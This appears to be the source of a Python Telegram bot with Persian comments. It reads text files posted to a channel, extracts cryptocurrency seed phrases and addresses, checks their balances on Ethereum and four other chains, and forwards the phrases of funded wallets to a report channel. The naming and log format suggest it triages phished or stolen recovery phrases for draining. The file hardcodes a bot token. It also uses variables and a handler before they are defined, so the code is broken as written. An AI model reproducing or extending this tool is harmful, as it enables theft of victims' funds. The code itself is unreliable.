import os
import re
import asyncio
import threading
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
from web3 import Web3
from keep_alive import keep_alive

from flask import Flask, request
from telegram import Update

app = Flask(__name__)

application = ApplicationBuilder().token(BOT_TOKEN).build()
application.add_handler(
    MessageHandler(filters.ChatType.CHANNEL & filters.Document.ALL, process_report_file)
)
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    application.update_queue.put_nowait(update)
    return "OK"
@app.route('/')
def home():
    return "Bot is running"

@app.route('/run')
def run():
    threading.Thread(target=lambda: asyncio.run(run_job())).start()
    return "running"

# --- تنظیمات ---
BOT_TOKEN = '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
SOURCE_CHANNEL_ID = '@rrxfq'
REPORT_CHANNEL_ID = '@regroupmywallet'

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
    'POLYGON': 'https://polygon-rpc.com',
    'ARB': 'https://arb1.arbitrum.io/rpc',
    'OP': 'https://mainnet.optimism.io'
}

# =========================
# بررسی موجودی ولت‌ها
# =========================
def check_all_balances(address):
    found_assets = []
    for name, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 5}))
            checksum_addr = Web3.to_checksum_address(address.strip())
            bal_wei = w3.eth.get_balance(checksum_addr)
            if bal_wei > 0:
                amount = float(w3.from_wei(bal_wei, 'ether'))
                found_assets.append({'network': name, 'amount': amount})
        except:
            continue
    return found_assets

# =========================
# پردازش فایل گزارش
# =========================
async def process_report_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post or not update.channel_post.document:
        return

    doc = update.channel_post.document
    if not doc.file_name.endswith('.txt'):
        return

    file = await context.bot.get_file(doc.file_id)
    content_bytes = await file.download_as_bytearray()
    content = content_bytes.decode('utf-8', errors='ignore')

    phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\[|Addr:|$)", content, re.DOTALL)
    addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)

    wallets = list(zip(phrases, addresses))

    if not wallets:
        await context.bot.send_message(
            chat_id=REPORT_CHANNEL_ID,
            text=f"❌ در فایل `{doc.file_name}` هیچ کیف پولی یافت نشد.",
            parse_mode='Markdown'
        )
        return

    total_balance_all = 0.0
    rich_details = ""

    for phrase, addr in wallets:
        clean_phrase = phrase.strip().replace('\n', ' ')
        assets = check_all_balances(addr)

        wallet_total = 0.0

        if assets:
            wallet_info = f"\n💎 **کیف پول دارای موجودی:**\n"
            wallet_info += f"🔑 Phrase:\n`{clean_phrase}`\n"
            wallet_info += f"📍 Address: `{addr}`\n"

            for asset in assets:
                wallet_total += asset['amount']
                total_balance_all += asset['amount']
                wallet_info += f"🌐 {asset['network']} → `{asset['amount']:.6f}`\n"

            wallet_info += f"💰 مجموع این کیف: `{wallet_total:.6f}`\n"
            wallet_info += "-------------------------\n"
            rich_details += wallet_info

    summary_msg = f"📂 **File:** `{doc.file_name}`\n"
    summary_msg += f"🔢 تعداد کیف‌ها: {len(wallets)}\n"
    summary_msg += f"💰 **مجموع کل همه کیف‌ها:** `{total_balance_all:.6f}`\n"

    await context.bot.send_message(
        chat_id=REPORT_CHANNEL_ID,
        text=summary_msg,
        parse_mode='Markdown'
    )

    if rich_details:
        if len(rich_details) > 4000:
            for i in range(0, len(rich_details), 4000):
                await context.bot.send_message(
                    chat_id=REPORT_CHANNEL_ID,
                    text=rich_details[i:i+4000],
                    parse_mode='Markdown'
                )
        else:
            await context.bot.send_message(
                chat_id=REPORT_CHANNEL_ID,
                text=rich_details,
                parse_mode='Markdown'
            )

# =========================
# اجرای خودکار همه فایل‌های کانال
# =========================
async def run_job():
    print("شروع بررسی همه فایل‌ها...")
    from telegram import Bot

    bot = Bot(token=BOT_TOKEN)
    updates = await bot.get_updates()  # آخرین آپدیت‌ها
    for update in updates:
        # فقط فایل‌های کانال
        if getattr(update, "channel_post", None) and getattr(update.channel_post, "document", None):
            # شبیه‌سازی ContextType
            class DummyContext:
                bot = bot
            await process_report_file(update, DummyContext())
    print("پایان بررسی")

# =========================
# اجرای اصلی
# =========================
if __name__ == "__main__":
    keep_alive()

    WEBHOOK_URL = "https://regroup-my-wallet.onrender.com/" + '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
    application.bot.set_webhook(WEBHOOK_URL)

    app.run(host="0.0.0.0", port=10000)
